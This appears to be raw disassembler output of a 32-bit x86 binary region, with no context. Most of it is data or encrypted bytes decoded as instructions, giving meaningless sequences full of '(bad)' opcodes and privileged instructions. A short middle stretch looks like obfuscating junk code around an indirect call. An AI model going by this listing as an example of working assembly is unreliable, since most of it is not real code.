  40aaa6:	call   0xf7ba:0xdaa64f13
  40aaad:	and    eax,0x8ca0b74a
  40aab2:	mov    DWORD PTR cs:[edi+0x68ae8af5],0xa07ca88c
  40aabd:	(bad)  
  40aabe:	xlat   BYTE PTR ds:[ebx]
  40aabf:	ins    DWORD PTR es:[edi],dx
  40aac0:	add    edx,DWORD PTR [ecx-0x3]
  40aac3:	xlat   BYTE PTR ds:[ebx]
  40aac4:	mov    al,0xee
  40aac6:	adc    ebx,DWORD PTR [edi]
  40aac8:	leave  
  40aac9:	jnp    0x40ab33
  40aacb:	(bad)  
  40aacc:	mov    dl,0x30
  40aace:	ficomp WORD PTR [ebp+ebp*1+0x8]
  40aad2:	pop    ebx
  40aad3:	fstp   TBYTE PTR [esi+0x41447e65]
  40aad9:	push   ebx
  40aada:	popa   
  40aadb:	int    0x86
  40aadd:	pop    edx
  40aade:	mov    ecx,0x95e3915f
  40aae3:	iret   
  40aae4:	push   ebx
  40aae5:	adc    eax,0x33629b56
  40aaea:	jge    0x40ab5a
  40aaec:	test   BYTE PTR [ebx],dh
  40aaee:	or     BYTE PTR [edx-0x45],0x6f
  40aaf2:	fwait
  40aaf3:	test   ch,bl
  40aaf5:	add    DWORD PTR [edi+0x58e85234],esi
  40aafb:	pop    esp
  40aafc:	adc    esp,DWORD PTR [edi]
  40aafe:	push   ebx
  40aaff:	jle    0x40ab31
  40ab01:	push   eax
  40ab02:	xchg   edi,eax
  40ab03:	aam    0x41
  40ab05:	mov    dl,0xd6
  40ab07:	or     DWORD PTR [edi+0x5f316ef9],0x44
  40ab0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab10:	and    eax,0xc8d6744d
  40ab15:	xor    cl,ah
  40ab17:	mov    bl,BYTE PTR [ebx]
  40ab19:	jg     0x40aab6
  40ab1b:	dec    edx
  40ab1c:	xor    al,BYTE PTR [ebp+0x91a77f5]
  40ab22:	pop    ds
  40ab23:	and    esp,DWORD PTR [esi-0xf]
  40ab26:	mov    edx,0x1e6260f5
  40ab2b:	loopne 0x40ab26
  40ab2d:	std    
  40ab2e:	stos   DWORD PTR es:[edi],eax
  40ab2f:	and    al,0xb0
  40ab31:	push   ss
  40ab32:	ja     0x40ab17
  40ab34:	ins    DWORD PTR es:[edi],dx
  40ab35:	sbb    edi,DWORD PTR [ebp+ecx*1-0x766ab423]
  40ab3c:	cmp    al,0x49
  40ab3e:	push   edx
  40ab3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab40:	aad    0x4c
  40ab42:	jns    0x40ab1d
  40ab44:	sbb    esp,DWORD PTR [esp+eax*4+0x3b]
  40ab48:	stc    
  40ab49:	mov    ?,WORD PTR [eax-0x36]
  40ab4c:	stos   DWORD PTR es:[edi],eax
  40ab4d:	xor    eax,DWORD PTR [edx+0x28]
  40ab50:	or     dh,BYTE PTR [ecx+0x49]
  40ab53:	aaa    
  40ab54:	aas    
  40ab55:	mov    dl,0x2c
  40ab57:	sbb    al,0x64
  40ab59:	jnp    0x40ab10
  40ab5b:	mov    eax,ds:0x3ac9fc3
  40ab60:	mov    DWORD PTR [ebx+0x56],0x6a088ae9
  40ab67:	outs   dx,DWORD PTR ds:[esi]
  40ab68:	push   cs
  40ab69:	pop    eax
  40ab6a:	test   BYTE PTR [bx+si],dl
  40ab6d:	mov    ch,0xc0
  40ab6f:	push   esi
  40ab70:	pop    ebp
  40ab71:	and    al,0xf
  40ab73:	xchg   ecx,eax
  40ab74:	cmp    BYTE PTR [edi-0x2d569861],ah
  40ab7a:	cli    
  40ab7b:	inc    ebp
  40ab7c:	repnz (bad) 
  40ab7e:	fimul  WORD PTR [edi-0xd]
  40ab81:	scas   al,BYTE PTR es:[edi]
  40ab82:	cwde   
  40ab83:	icebp  
  40ab84:	push   ecx
  40ab85:	or     edx,DWORD PTR [esi-0x3a7a0e43]
  40ab8b:	adc    DWORD PTR [eax-0x49],esi
  40ab8e:	add    al,0xb0
  40ab90:	dec    esi
  40ab91:	enter  0xc91,0xc0
  40ab95:	xchg   ebp,eax
  40ab96:	mov    BYTE PTR [ecx-0x7c807e51],cl
  40ab9c:	mov    ds:0x8a265233,eax
  40aba1:	iret   
  40aba2:	mov    edi,0xddd62869
  40aba7:	lahf   
  40aba8:	and    eax,0x53f72a1a
  40abad:	jmp    0x40ab68
  40abaf:	push   ebx
  40abb0:	in     al,dx
  40abb1:	retf   
  40abb2:	pop    ebx
  40abb3:	out    dx,eax
  40abb4:	lahf   
  40abb5:	fnstcw WORD PTR [ebx-0x6eac0b0c]
  40abbb:	out    dx,al
  40abbc:	outs   dx,DWORD PTR ds:[esi]
  40abbd:	out    dx,eax
  40abbe:	push   ss
  40abbf:	or     edi,ebx
  40abc1:	mov    es,edx
  40abc3:	adc    ah,al
  40abc5:	inc    esi
  40abc6:	ja     0x40abed
  40abc8:	imul   ecx,DWORD PTR [eax+0x3966c911],0x6bfc159a
  40abd2:	push   0xffffffd9
  40abd4:	or     al,0x6f
  40abd6:	pushf  
  40abd7:	adc    DWORD PTR [ecx+0x419fa862],ebp
  40abdd:	mov    ecx,0xd50e5536
  40abe2:	cmp    al,0xe
  40abe4:	xchg   ebx,eax
  40abe5:	jbe    0x40ab86
  40abe7:	int3   
  40abe8:	stos   DWORD PTR es:[edi],eax
  40abe9:	popf   
  40abea:	pop    ebp
  40abeb:	rcr    BYTE PTR [ebx],0x46
  40abee:	sti    
  40abef:	es retf 0x485
  40abf3:	int3   
  40abf4:	dec    BYTE PTR [ebx-0x44352a45]
  40abfa:	test   DWORD PTR [esi],ebx
  40abfc:	iret   
  40abfd:	fdiv   st(3),st
  40abff:	dec    ecx
  40ac00:	in     al,dx
  40ac01:	test   al,0xb7
  40ac03:	jmp    0x40ac07
  40ac05:	or     eax,0x65aa7683
  40ac0a:	std    
  40ac0b:	xlat   BYTE PTR ds:[ebx]
  40ac0c:	inc    edi
  40ac0d:	mov    ebx,ecx
  40ac0f:	cld    
  40ac10:	push   ss
  40ac11:	xor    BYTE PTR [ecx],0x88
  40ac14:	sbb    eax,DWORD PTR [edi+0x56ad2dfc]
  40ac1a:	test   al,0x59
  40ac1c:	jge    0x40ac07
  40ac1e:	fldenv [ebx+0x3cec8a18]
  40ac24:	ins    DWORD PTR es:[edi],dx
  40ac25:	adc    DWORD PTR [ecx],esi
  40ac27:	cdq    
  40ac28:	jecxz  0x40ac1a
  40ac2a:	adc    al,0xba
  40ac2c:	mov    ss,WORD PTR [edx-0x5c]
  40ac2f:	jge    0x40abcf
  40ac31:	sbb    bl,al
  40ac33:	popf   
  40ac34:	push   ss
  40ac35:	push   edi
  40ac36:	retf   0x149
  40ac39:	(bad)  
  40ac3a:	fiadd  DWORD PTR [ebp+0x26]
  40ac3d:	clc    
  40ac3e:	pop    es
  40ac3f:	ficom  WORD PTR [edx+0x7d]
  40ac42:	mov    eax,ds:0x65745651
  40ac47:	js     0x1beaaead
  40ac4d:	loope  0x40ac2a
  40ac4f:	or     eax,edx
  40ac51:	stc    
  40ac52:	mov    ah,0x59
  40ac54:	push   ebx
  40ac55:	fisttp QWORD PTR [ebx]
  40ac57:	jbe    0x40ac36
  40ac59:	xor    al,BYTE PTR [edi-0x166b8d96]
  40ac5f:	leave  
  40ac60:	nop
  40ac61:	ss mov edi,esp
  40ac64:	cmp    ecx,DWORD PTR [ebp-0x63e4e7e4]
  40ac6a:	xchg   esp,eax
  40ac6b:	ja     0x40ac93
  40ac6d:	js     0x40ac16
  40ac6f:	aaa    
  40ac70:	retf   0xb3b
  40ac73:	stos   DWORD PTR es:[edi],eax
  40ac74:	fisubr DWORD PTR [edi-0x43]
  40ac77:	adc    eax,0x5cf04f84
  40ac7c:	ins    DWORD PTR es:[edi],dx
  40ac7d:	push   edx
  40ac7e:	jns    0x40ac8c
  40ac80:	shl    BYTE PTR [eax],cl
  40ac82:	popf   
  40ac83:	xor    al,BYTE PTR [ebx-0x28]
  40ac86:	or     edi,esp
  40ac88:	or     ecx,esp
  40ac8a:	adc    esp,edi
  40ac8c:	add    dl,al
  40ac8e:	sar    DWORD PTR [edx-0x59],cl
  40ac91:	test   al,0x35
  40ac93:	push   edi
  40ac94:	shl    BYTE PTR [edi+ebp*1+0x54],0x59
  40ac99:	jbe    0x40ac26
  40ac9b:	cs jo  0x40ac56
  40ac9e:	xchg   ebx,eax
  40ac9f:	pushf  
  40aca0:	ficom  DWORD PTR [ebx]
  40aca2:	and    eax,0xd1440e2
  40aca7:	and    ecx,edi
  40aca9:	clc    
  40acaa:	mov    ebx,0xc41e25c2
  40acaf:	sbb    eax,0xc7981d03
  40acb4:	fs (bad) 
  40acb6:	inc    di
  40acb8:	ja     0x40acb6
  40acba:	sub    dl,BYTE PTR [esi-0x33]
  40acbd:	ins    DWORD PTR es:[edi],dx
  40acbe:	adc    eax,0xabbec625
  40acc3:	jb     0x40ad01
  40acc5:	inc    eax
  40acc6:	pop    ss
  40acc7:	mov    eax,ds:0xcfa8ca6f
  40accc:	mov    edx,0x856a38c1
  40acd1:	cmp    ah,0xd8
  40acd4:	push   ds
  40acd5:	sub    al,0xa2
  40acd7:	xchg   bl,dl
  40acd9:	mov    esi,0x64d96fc2
  40acde:	fmul   QWORD PTR [edx+0x12cbdee4]
  40ace4:	call   0x68d4:0x728b0a51
  40aceb:	arpl   WORD PTR [esi],di
  40aced:	sbb    cl,BYTE PTR [ecx]
  40acef:	jp     0x40ac99
  40acf1:	(bad)  
  40acf2:	rcl    DWORD PTR [eax+edi*2],cl
  40acf5:	mov    ebp,0xc46d6672
  40acfa:	push   edi
  40acfb:	sahf   
  40acfc:	lahf   
  40acfd:	xchg   ebp,eax
  40acfe:	jb     0x40acec
  40ad00:	scas   al,BYTE PTR es:[edi]
  40ad01:	mov    bl,0x81
  40ad03:	adc    dl,BYTE PTR [edi]
  40ad05:	ins    DWORD PTR es:[edi],dx
  40ad06:	mov    dl,0xb3
  40ad08:	xchg   DWORD PTR [ecx],esi
  40ad0a:	stos   DWORD PTR es:[edi],eax
  40ad0b:	outs   dx,BYTE PTR ds:[esi]
  40ad0c:	pop    ds
  40ad0d:	sub    BYTE PTR [ecx+0x19],al
  40ad10:	pop    ebp
  40ad11:	aaa    
  40ad12:	div    DWORD PTR [edi+ebx*2]
  40ad15:	mov    ebp,0x2b1f703
  40ad1a:	jg     0x40ad5a
  40ad1c:	fidiv  DWORD PTR [ebx+0x1]
  40ad1f:	mov    ebp,0xd8300ee4
  40ad24:	add    eax,0xd4019437
  40ad29:	push   ecx
  40ad2a:	in     al,0xe
  40ad2c:	imul   esi,edi,0xa
  40ad2f:	push   edx
  40ad30:	or     al,0xc
  40ad32:	dec    ecx
  40ad33:	lds    ebx,FWORD PTR [esi-0x69818c0f]
  40ad39:	fadd   st,st(4)
  40ad3b:	int3   
  40ad3c:	jecxz  0x40ad69
  40ad3e:	mov    cl,0xe6
  40ad40:	push   es
  40ad41:	aaa    
  40ad42:	mov    ebx,0xcc7b21db
  40ad47:	in     al,0x5f
  40ad49:	bound  eax,QWORD PTR [ebp+0x54710223]
  40ad4f:	addr16 daa 
  40ad51:	imul   eax,ecx,0xffffffae
  40ad54:	stos   DWORD PTR es:[edi],eax
  40ad55:	iret   
  40ad56:	unpcklps xmm1,XMMWORD PTR [eax-0x34]
  40ad5a:	int3   
  40ad5b:	xchg   esi,eax
  40ad5c:	in     al,0xf0
  40ad5e:	js     0x40ad2c
  40ad60:	fwait
  40ad61:	jmp    0x40ad35
  40ad63:	setl   BYTE PTR [ebx-0x68]
  40ad67:	add    BYTE PTR [ebx+0xd05286d],ch
  40ad6d:	push   0x37
  40ad6f:	xor    al,0xfb
  40ad71:	dec    esp
  40ad72:	outs   dx,BYTE PTR ds:[esi]
  40ad73:	inc    esp
  40ad74:	add    eax,0x7e2f7e2a
  40ad79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad7a:	push   esi
  40ad7b:	push   esp
  40ad7c:	jl     0x40ad65
  40ad7e:	clc    
  40ad7f:	xor    ah,bh
  40ad81:	jle    0x40ad09
  40ad83:	jne    0x40adee
  40ad85:	stos   DWORD PTR es:[edi],eax
  40ad86:	sbb    DWORD PTR [ebx],edi
  40ad88:	mov    al,0xe8
  40ad8a:	cmp    eax,0x7ab4c425
  40ad8f:	pop    esi
  40ad90:	jns    0x40ad86
  40ad92:	and    al,0xd2
  40ad94:	adc    ecx,edx
  40ad96:	outs   dx,DWORD PTR ds:[esi]
  40ad97:	fstp   TBYTE PTR [esi]
  40ad99:	jb     0x40ad26
  40ad9b:	fbld   TBYTE PTR [edi+0x1d8b996]
  40ada1:	or     al,0x18
  40ada3:	hlt    
  40ada4:	rcl    bl,0x86
  40ada7:	mov    gs,WORD PTR [ebx+0x6]
  40adaa:	aas    
  40adab:	mov    ebp,DWORD PTR [ebp+0x6116226d]
  40adb1:	leave  
  40adb2:	out    0xe1,eax
  40adb4:	imul   esp,DWORD PTR [eax],0x852209fe
  40adba:	sub    BYTE PTR [edx-0x181bc646],cl
  40adc0:	div    dh
  40adc2:	push   edx
  40adc3:	sub    cl,BYTE PTR [eax-0x4ced40f4]
  40adc9:	pusha  
  40adca:	jnp    0x40ae40
  40adcc:	and    eax,0x9676c3c8
  40add1:	pop    ebp
  40add2:	sub    BYTE PTR [eax+0x45f47fa4],bh
  40add8:	dec    esp
  40add9:	test   eax,0xc305d1f4
  40adde:	leave  
  40addf:	xor    DWORD PTR ds:0xc10277f,edi
  40ade5:	or     eax,0x47c16135
  40adea:	(bad)  
  40adeb:	mov    ebx,0xfffedfc
  40adf0:	test   eax,0x55ce170b
  40adf5:	pop    esp
  40adf6:	lea    edx,[esi+esi*1]
  40adf9:	aam    0xa1
  40adfb:	sub    DWORD PTR [ebx+eiz*8+0x68b8922d],ebp
  40ae02:	aad    0xc
  40ae04:	push   eax
  40ae05:	mov    bh,0x23
  40ae07:	xchg   eax,eax
  40ae09:	sbb    bl,ch
  40ae0b:	xor    edi,DWORD PTR [esi+0x9126291]
  40ae11:	fidiv  DWORD PTR [edi-0x54ec7045]
  40ae17:	push   esp
  40ae18:	daa    
  40ae19:	mov    esi,0xfa08bda0
  40ae1e:	(bad)  
  40ae1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae20:	icebp  
  40ae21:	and    eax,0xd9ea2d9a
  40ae26:	or     DWORD PTR [edi+0xcd408e8],ebx
  40ae2c:	xchg   esp,eax
  40ae2d:	jb     0x40adfb
  40ae2f:	aam    0xca
  40ae31:	ja     0x40aeab
  40ae33:	fdivr  st,st(0)
  40ae35:	jp     0x40aeb3
  40ae37:	sub    ecx,DWORD PTR [ecx+0x73c1ae88]
  40ae3d:	scas   al,BYTE PTR es:[edi]
  40ae3e:	test   ecx,esp
  40ae40:	(bad)  [ebx+0x5]
  40ae43:	mov    cl,BYTE PTR [ebp+0x184bc1c2]
  40ae49:	mov    DWORD PTR [ebp-0x20],0x6ec3
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x4282db,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x4282a3
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x4283d7,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x4282bb
  40aea0:	cmp    DWORD PTR ds:0x4282db,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x42810b
  40aebd:	call   DWORD PTR ds:0x428ec8
  40aec3:	mov    ecx,DWORD PTR ds:0x42835b
  40aec9:	xor    DWORD PTR ds:0x42827f,ecx
  40aecf:	or     DWORD PTR ds:0x4283cb,ecx
  40aed5:	or     DWORD PTR ds:0x4282e3,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x4282ef
  40aee1:	adc    DWORD PTR ds:0x4282b7,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x4281b3
  40aeef:	adc    ecx,DWORD PTR ds:0x4283d7
  40aef5:	mov    DWORD PTR ds:0x4281b3,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x4283d3,0x428347
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x4281b3,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	push   ebx
  40af30:	push   ss
  40af31:	lds    edi,FWORD PTR [ebp+esi*4+0x1b]
  40af35:	sbb    BYTE PTR [eax],bl
  40af37:	outs   dx,BYTE PTR ds:[esi]
  40af38:	adc    bl,BYTE PTR [eax]
  40af3a:	sbb    bh,dl
  40af3c:	loop   0x40aefa
  40af3e:	loopne 0x40af47
  40af40:	push   edi
  40af41:	adc    eax,0x3ab23306
  40af46:	not    DWORD PTR [edx]
  40af48:	jmp    0x34ce2f4b
  40af4d:	aad    0xe8
  40af4f:	test   BYTE PTR [esp+ebp*1],cl
  40af52:	(bad)  
  40af53:	inc    eax
  40af54:	popa   
  40af55:	pop    edi
  40af56:	out    0x66,eax
  40af58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af59:	or     DWORD PTR [esi],0x34
  40af5c:	lods   al,BYTE PTR ds:[esi]
  40af5d:	sahf   
  40af5e:	(bad)  
  40af5f:	repnz adc al,0x27
  40af62:	outs   dx,DWORD PTR ds:[esi]
  40af63:	ja     0x40af21
  40af65:	sub    ch,bh
  40af67:	push   0x28
  40af69:	das    
  40af6a:	mov    dl,0x5c
  40af6c:	es jo  0x40afcd
  40af6f:	xchg   esi,eax
  40af70:	jbe    0x40afca
  40af72:	inc    ebp
  40af73:	dec    edx
  40af74:	jle    0x40af7e
  40af76:	test   dl,0x6d
  40af79:	sti    
  40af7a:	add    edi,edx
  40af7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af7d:	fcomp  st(0)
  40af7f:	sbb    BYTE PTR [eax-0x79],bl
  40af82:	dec    edx
  40af83:	les    ecx,FWORD PTR [eax-0x6366bf9]
  40af89:	mov    ds:0xcc6c39a1,eax
  40af8e:	mov    eax,ds:0xb3e78053
  40af93:	daa    
  40af94:	adc    BYTE PTR [ebx+0x12],bl
  40af97:	cmp    bh,BYTE PTR [eax+0x6496ae9c]
  40af9d:	ins    DWORD PTR es:[edi],dx
  40af9e:	sbb    ebp,DWORD PTR [esi+0x7a7d89cd]
  40afa4:	add    DWORD PTR [ebp+0x116f8c21],ebp
  40afaa:	push   ss
  40afab:	mov    ds:0x90ddf25c,eax
  40afb0:	stos   BYTE PTR es:[edi],al
  40afb1:	add    al,0x17
  40afb3:	xor    esi,edx
  40afb5:	jno    0x40af46
  40afb7:	cmp    al,BYTE PTR [ebx-0x76242c8c]
  40afbd:	dec    ecx
  40afbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afbf:	out    0x7,al
  40afc1:	icebp  
  40afc2:	sahf   
  40afc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc4:	call   0x5cdf:0xc9550ae2
  40afcb:	xor    eax,0x8ea26c1d
  40afd0:	add    esi,DWORD PTR [edx-0x1a]
  40afd3:	ins    BYTE PTR es:[edi],dx
  40afd4:	das    
  40afd5:	sub    ecx,ebp
  40afd7:	add    al,0x5e
  40afd9:	inc    bx
  40afdb:	and    al,ah
  40afdd:	push   0x8f782f81
  40afe2:	mul    esp
  40afe4:	mov    BYTE PTR [ebp-0x585f8e99],ch
  40afea:	out    dx,al
  40afeb:	xor    DWORD PTR [esi+0x41],edi
  40afee:	and    al,0x8e
  40aff0:	test   esp,edi
  40aff2:	sti    
  40aff3:	xor    eax,0x4aa8afca
  40aff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aff9:	imul   ebp,edi,0xffffffb4
  40affc:	xor    ch,BYTE PTR [eax]
  40affe:	push   0xda816723
  40b003:	jne    0x40afd1
  40b005:	sub    DWORD PTR [ebx-0x23e0c29c],ecx
  40b00b:	sbb    DWORD PTR [ebp+0x78f5fbc2],eax
  40b011:	add    BYTE PTR [eax],dh
  40b013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b014:	sti    
  40b015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b016:	push   edi
  40b017:	addr16 xor eax,0x8740eebe
  40b01d:	pop    esp
  40b01e:	int    0x5e
  40b020:	mov    bh,0xd2
  40b022:	out    0xc2,eax
  40b024:	pop    ebx
  40b025:	dec    eax
  40b026:	or     dh,BYTE PTR [eax+0x7]
  40b029:	cmp    esi,DWORD PTR [ecx+0x47648904]
  40b02f:	hlt    
  40b030:	iret   
  40b031:	inc    edx
  40b032:	mov    fs,WORD PTR [ecx]
  40b034:	(bad)  
  40b035:	lea    ebx,[edi+0x40558124]
  40b03b:	pop    ecx
  40b03c:	loop   0x40b001
  40b03e:	and    eax,0x992aa1d2
  40b043:	stos   BYTE PTR es:[edi],al
  40b044:	or     DWORD PTR [ebx],edx
  40b046:	sbb    DWORD PTR [ecx],ebx
  40b048:	ret    0xd61a
  40b04b:	stos   BYTE PTR es:[edi],al
  40b04c:	and    BYTE PTR [edx],ch
  40b04e:	push   edx
  40b04f:	mov    edx,0xd5d7aec8
  40b054:	cdq    
  40b055:	jmp    0xb563:0x68da086e
  40b05c:	lods   al,BYTE PTR ds:[esi]
  40b05d:	bound  esi,QWORD PTR [ecx+0x7fdaf952]
  40b063:	iret   
  40b064:	cmp    esi,DWORD PTR [edx-0x3df4c529]
  40b06a:	xchg   ebx,eax
  40b06b:	pop    ss
  40b06c:	dec    esi
  40b06d:	xlat   BYTE PTR ds:[ebx]
  40b06e:	je     0x40b087
  40b070:	mov    ds:0xc65c308d,eax
  40b075:	out    dx,al
  40b076:	ins    DWORD PTR es:[edi],dx
  40b077:	out    0xa6,eax
  40b079:	and    ecx,edi
  40b07b:	add    al,0x28
  40b07d:	call   0x79ae:0xf766e8bc
  40b084:	pop    esp
  40b085:	fdivr  QWORD PTR [ebx-0x5a]
  40b088:	aas    
  40b089:	xchg   edi,eax
  40b08a:	add    eax,0x4b5eb276
  40b08f:	mov    edx,esp
  40b091:	adc    al,0x2a
  40b093:	cmp    BYTE PTR [edx],dl
  40b095:	and    esi,DWORD PTR ds:0xa1538eee
  40b09b:	(bad)  
  40b09c:	mov    ebx,DWORD PTR [ebx]
  40b09e:	pop    edx
  40b09f:	mov    edi,0xbe169c4f
  40b0a4:	push   edx
  40b0a5:	xchg   BYTE PTR [esi+ebx*1-0x68],ah
  40b0a9:	fdiv   QWORD PTR [eax-0x46dec5b2]
  40b0af:	pop    bp
  40b0b1:	adc    DWORD PTR [ecx],edx
  40b0b3:	icebp  
  40b0b4:	or     DWORD PTR [ebx],0xffffffa7
  40b0b7:	xor    esp,ecx
  40b0b9:	in     al,0x46
  40b0bb:	daa    
  40b0bc:	cdq    
  40b0bd:	push   0xffffffc8
  40b0bf:	jo     0x40b0f7
  40b0c1:	and    DWORD PTR [edi],ebx
  40b0c3:	jmp    0xb540912a
  40b0c8:	ins    BYTE PTR es:[edi],dx
  40b0c9:	ds mov cl,dl
  40b0cc:	js     0x40b05f
  40b0ce:	mov    ch,0xf5
  40b0d0:	add    BYTE PTR [edi],ch
  40b0d2:	jbe    0x40b0da
  40b0d4:	mov    eax,ds:0xb17bdb42
  40b0d9:	loop   0x40b0be
  40b0db:	push   esp
  40b0dc:	(bad)  
  40b0dd:	push   0x4bb8ad98
  40b0e2:	call   0x685db7db
  40b0e7:	cli    
  40b0e8:	imul   esi,esp,0x23
  40b0eb:	ret    
  40b0ec:	or     DWORD PTR [esi-0x72],ecx
  40b0ef:	jp     0x40b0af
  40b0f1:	test   BYTE PTR [esi],bl
  40b0f3:	daa    
  40b0f4:	xor    edi,esp
  40b0f6:	jnp    0x40b0c0
  40b0f8:	xchg   edx,edx
  40b0fa:	xlat   BYTE PTR ds:[ebx]
  40b0fb:	pop    ss
  40b0fc:	pop    edi
  40b0fd:	jecxz  0x40b114
  40b0ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b100:	icebp  
  40b101:	jb     0x40b0a8
  40b103:	lea    ebp,ds:0x3aed7de4
  40b109:	and    BYTE PTR [edx+0x3b5ecdaa],0x18
  40b110:	out    0x5a,eax
  40b112:	or     DWORD PTR [ecx-0x21],0x1b
  40b116:	or     BYTE PTR [ecx-0x11],ch
  40b119:	pop    esi
  40b11a:	fisttp QWORD PTR [ebx-0x5a6af2c7]
  40b120:	fisubr DWORD PTR [edi-0x7565c341]
  40b126:	into   
  40b127:	in     eax,dx
  40b128:	sbb    BYTE PTR [esi+0x59e7fd99],al
  40b12e:	jbe    0x40b151
  40b130:	or     al,0xb
  40b132:	adc    esp,DWORD PTR [ebx+0xb66b2de]
  40b138:	sbb    bl,BYTE PTR [ebx]
  40b13a:	outs   dx,DWORD PTR ss:[esi]
  40b13c:	jo     0x40b138
  40b13e:	pop    edx
  40b13f:	jno    0x40b148
  40b141:	sub    ch,BYTE PTR [esi]
  40b143:	mov    ah,0x8e
  40b145:	mov    edx,0xfbe90b9d
  40b14a:	aaa    
  40b14b:	pop    ebp
  40b14c:	aad    0x4a
  40b14e:	cmp    al,al
  40b150:	add    BYTE PTR [eax+0x71],0xbd
  40b154:	aad    0x3
  40b156:	mov    BYTE PTR [esi],dh
  40b158:	mov    BYTE PTR [edi+0x5f],0xe2
  40b15c:	xlat   BYTE PTR ds:[ebx]
  40b15d:	iret   
  40b15e:	cmp    eax,DWORD PTR [edx-0x62]
  40b161:	mov    edx,0x959a8af6
  40b166:	and    al,0xb9
  40b168:	mov    edx,0x7ba1d830
  40b16d:	jne    0x40b1de
  40b16f:	push   edi
  40b170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b171:	ret    
  40b172:	out    dx,eax
  40b173:	clc    
  40b174:	dec    edx
  40b175:	shr    DWORD PTR [edi-0x7e],cl
  40b178:	xor    al,0xc5
  40b17a:	aaa    
  40b17b:	sub    bl,BYTE PTR [eax+0x2c88888d]
  40b181:	jne    0x40b192
  40b183:	out    dx,al
  40b184:	mul    ebp
  40b186:	push   ebx
  40b187:	in     al,0x6e
  40b189:	and    edi,DWORD PTR [edi+0x57]
  40b18c:	(bad)  
  40b18e:	pushf  
  40b18f:	fwait
  40b190:	xchg   edx,eax
  40b191:	xor    BYTE PTR [eax-0x5c75947c],cl
  40b197:	sub    al,0xfb
  40b199:	sbb    eax,0x5bff711
  40b19e:	ror    DWORD PTR [edx-0x38],0x52
  40b1a2:	push   0xc5a33d2
  40b1a7:	inc    ebp
  40b1a8:	fcmovnb st,st(3)
  40b1aa:	daa    
  40b1ab:	retf   
  40b1ac:	ins    DWORD PTR es:[edi],dx
  40b1ad:	lods   al,BYTE PTR ds:[esi]
  40b1ae:	push   eax
  40b1af:	mov    ebx,0x1376dca2
  40b1b4:	and    eax,0xfddfed65
  40b1b9:	aas    
  40b1ba:	pop    es
  40b1bb:	(bad)  
  40b1bc:	jno    0x40b19d
  40b1be:	and    al,0x96
  40b1c0:	pop    edx
  40b1c1:	iret   
  40b1c2:	call   0xf0edbd38
  40b1c7:	dec    eax
  40b1c8:	push   cs
  40b1c9:	sar    DWORD PTR [eax],0x82
  40b1cc:	add    DWORD PTR [esi+ebx*2+0x39],0xa8efd162
  40b1d4:	xchg   esi,eax
  40b1d5:	mov    ch,0x7a
  40b1d7:	sub    DWORD PTR [edx],0x950f71ee
  40b1dd:	add    al,dl
  40b1df:	lock mov BYTE PTR [esi+0x222acf36],bl
  40b1e6:	loopne 0x40b196
  40b1e8:	jae    0x40b16c
  40b1ea:	and    eax,0x8edca87d
  40b1ef:	cwde   
  40b1f0:	mov    BYTE PTR [ebx-0x463164d1],cl
  40b1f6:	bound  esp,QWORD PTR [ebx-0x7b0bb720]
  40b1fc:	jle    0x40b26f
  40b1fe:	aam    0xc8
  40b200:	or     eax,0xac433a86
  40b205:	shr    esp,cl
  40b207:	add    eax,0x8cbbe55e
  40b20c:	adc    BYTE PTR [esi+0x56],cl
  40b20f:	pop    ds
  40b210:	cli    
  40b211:	imul   ecx,esp,0x9fbafd45
  40b217:	mov    ebp,0x167e4306
  40b21c:	lds    edi,FWORD PTR fs:[edx+edi*1]
  40b220:	and    esi,DWORD PTR [esi]
  40b222:	pusha  
  40b223:	cmp    al,0xcb
  40b225:	xchg   ebx,eax
  40b226:	loope  0x40b1cf
  40b228:	lea    eax,[ebp+ecx*8+0x2f5309e6]
  40b22f:	sub    edi,DWORD PTR [edi-0x7c]
  40b232:	push   esi
  40b233:	sahf   
  40b234:	cwde   
  40b235:	cmp    BYTE PTR [eax+0x3b],ch
  40b238:	xchg   BYTE PTR [edi-0x75],dh
  40b23b:	cmp    DWORD PTR ds:0xf3ef83ab,0xffffffaf
  40b242:	and    BYTE PTR [eax-0x43],bl
  40b245:	sbb    ah,BYTE PTR [esi+edi*1+0x4c69ee36]
